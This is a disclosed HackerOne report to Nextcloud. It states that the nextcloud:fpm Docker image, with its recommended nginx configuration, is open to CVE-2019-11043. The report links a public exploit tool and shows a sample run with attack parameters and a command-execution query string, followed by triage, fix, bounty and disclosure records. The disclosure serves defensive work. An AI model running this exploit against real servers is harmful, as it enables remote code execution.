{"id":720306,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjAzMDY=","url":"https://hackerone.com/reports/720306","title":"Docker image with FPM is vulnerable to CVE-2019-11043","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-10-22T16:44:12.038Z","submitted_at":"2019-10-22T16:44:12.038Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"beched","url":"/beched","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/150/722dfafad5a15d2eddb75a685238cb156a1c6e97_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-14T10:09:58.162Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-02-13T10:09:56.134Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The CVE-2019-11043 vulnerability can be exploited in the latest nextcloud:fpm image.\n\nThis is due to the specific nginx configuration recommended for nextcloud:\nhttps://github.com/nextcloud/docker#base-version---fpm\nhttps://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx.rst\nhttps://github.com/nextcloud/docker/blob/master/.examples/docker-compose/with-nginx-proxy/mariadb/fpm/web/nginx.conf\n\nHere's the exploit: https://github.com/neex/phuip-fpizdam\n\nSample exploit run:\n# ./phuip-fpizdam http://localhost:8080/ocs/v2.php\n2019/10/22 19:36:29 Base status code is 200\n2019/10/22 19:36:30 Status code 502 for qsl=1765, adding as a candidate\n2019/10/22 19:36:31 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]\n2019/10/22 19:36:48 Attack params found: --qsl 1760 --pisos 191 --skip-detect\n2019/10/22 19:36:48 Trying to set \"session.auto_start=0\"...\n2019/10/22 19:36:50 Detect() returned attack params: --qsl 1760 --pisos 191 --skip-detect \u003c-- REMEMBER THIS\n2019/10/22 19:36:50 Performing attack using php.ini settings...\n2019/10/22 19:36:52 Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'\u0026\" to URLs\n2019/10/22 19:36:52 Trying to cleanup /tmp/a...\n2019/10/22 19:36:52 Done!\n\nTo fix the issue, you need to update PHP-FPM version in the nextcloud:fpm image.\nReference: https://bugs.php.net/bug.php?id=78599\n\n## Impact\n\nExecute arbitrary PHP code on the target server","vulnerability_information_html":"\u003cp\u003eThe CVE-2019-11043 vulnerability can be exploited in the latest nextcloud:fpm image.\u003c/p\u003e\n\n\u003cp\u003eThis is due to the specific nginx configuration recommended for nextcloud:\u003cbr\u003e\n\u003ca title=\"https://github.com/nextcloud/docker#base-version---fpm\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fdocker%23base-version---fpm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/docker#base-version---fpm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx.rst\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fdocumentation%2Fblob%2Fmaster%2Fadmin_manual%2Finstallation%2Fnginx.rst\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx.rst\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/nextcloud/docker/blob/master/.examples/docker-compose/with-nginx-proxy/mariadb/fpm/web/nginx.conf\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fdocker%2Fblob%2Fmaster%2F.examples%2Fdocker-compose%2Fwith-nginx-proxy%2Fmariadb%2Ffpm%2Fweb%2Fnginx.conf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/docker/blob/master/.examples/docker-compose/with-nginx-proxy/mariadb/fpm/web/nginx.conf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s the exploit: \u003ca title=\"https://github.com/neex/phuip-fpizdam\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fneex%2Fphuip-fpizdam\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/neex/phuip-fpizdam\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSample exploit run:\u003c/p\u003e\n\n\u003ch1 id=\"phuip-fpizdam-http-localhost-8080-ocs-v2-php\"\u003e./phuip-fpizdam \u003ca title=\"http://localhost:8080/ocs/v2.php\" href=\"/redirect?url=http%3A%2F%2Flocalhost%3A8080%2Focs%2Fv2.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost:8080/ocs/v2.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/h1\u003e\n\n\u003cp\u003e2019/10/22 19:36:29 Base status code is 200\u003cbr\u003e\n2019/10/22 19:36:30 Status code 502 for qsl=1765, adding as a candidate\u003cbr\u003e\n2019/10/22 19:36:31 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]\u003cbr\u003e\n2019/10/22 19:36:48 Attack params found: --qsl 1760 --pisos 191 --skip-detect\u003cbr\u003e\n2019/10/22 19:36:48 Trying to set \u0026quot;session.auto_start=0\u0026quot;...\u003cbr\u003e\n2019/10/22 19:36:50 Detect() returned attack params: --qsl 1760 --pisos 191 --skip-detect \u0026lt;-- REMEMBER THIS\u003cbr\u003e\n2019/10/22 19:36:50 Performing attack using php.ini settings...\u003cbr\u003e\n2019/10/22 19:36:52 Success! Was able to execute a command by appending \u0026quot;?a=/bin/sh+-c+\u0026#39;which+which\u0026#39;\u0026amp;\u0026quot; to URLs\u003cbr\u003e\n2019/10/22 19:36:52 Trying to cleanup /tmp/a...\u003cbr\u003e\n2019/10/22 19:36:52 Done!\u003c/p\u003e\n\n\u003cp\u003eTo fix the issue, you need to update PHP-FPM version in the nextcloud:fpm image.\u003cbr\u003e\nReference: \u003ca title=\"https://bugs.php.net/bug.php?id=78599\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D78599\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=78599\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eExecute arbitrary PHP code on the target server\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-14T10:09:56.202Z","allow_singular_disclosure_after":-25043504.1121736,"singular_disclosure_allowed":true,"vote_count":14,"voters":["a_d_a_m","mygf","ms-13","cryptographer","b69fb2ebda43240ece9dbeb","falsesimba","exp___","danila-mailru","anonboyhacker","surreal212","and 4 more..."],"severity":{"rating":"critical","score":9.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":13,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/server","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6108576,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2019-10-22T16:44:12.557Z","updated_at":"2019-10-22T16:44:12.557Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6113930,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @beched,\n\nthanks for your report.\nI'll verify and see if we can fix the issue and get back to you.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi \u003ca href=\"/beched\"\u003e@beched\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003ethanks for your report.\u003cbr\u003e\nI\u0026#39;ll verify and see if we can fix the issue and get back to you.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-23T07:23:17.193Z","updated_at":"2019-10-23T07:23:17.193Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6122546,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @beched,\n\nWe had a look here.\nI think the fix in https://github.com/nextcloud/documentation/tree/harden/nginx mitigates the issue.\nWhile we are testing internally could you verify this as well?\n\nThanks,\n--Roeland","markdown_message":"\u003cp\u003eHi \u003ca href=\"/beched\"\u003e@beched\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe had a look here.\u003cbr\u003e\nI think the fix in \u003ca title=\"https://github.com/nextcloud/documentation/tree/harden/nginx\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fdocumentation%2Ftree%2Fharden%2Fnginx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/documentation/tree/harden/nginx\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e mitigates the issue.\u003cbr\u003e\nWhile we are testing internally could you verify this as well?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-24T07:27:05.903Z","updated_at":"2019-10-24T07:27:05.903Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6123592,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-24T08:44:56.896Z","updated_at":"2019-10-24T08:44:56.896Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6771465,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi guys, what're the next steps on this report?\nI haven't replied to the last message because at that time the branch had already been merged, and the fix has been accepted.","markdown_message":"\u003cp\u003eHi guys, what\u0026#39;re the next steps on this report?\u003cbr\u003e\nI haven\u0026#39;t replied to the last message because at that time the branch had already been merged, and the fix has been accepted.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-14T21:26:30.554Z","updated_at":"2020-01-14T21:26:30.554Z","actor":{"username":"beched","cleared":false,"url":"/beched","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/150/722dfafad5a15d2eddb75a685238cb156a1c6e97_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6978745,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This has been resolved in the meantime","markdown_message":"\u003cp\u003eThanks a lot for your report again. This has been resolved in the meantime\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-06T13:29:36.506Z","updated_at":"2020-02-06T13:29:36.506Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"beched","url":"/beched"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7039606,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-13T09:09:35.524Z","updated_at":"2020-02-13T09:09:35.524Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"beched","url":"/beched"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7040335,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-13T10:09:56.149Z","updated_at":"2020-02-13T10:09:56.149Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7317170,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-14T10:09:58.183Z","updated_at":"2020-03-14T10:09:58.183Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}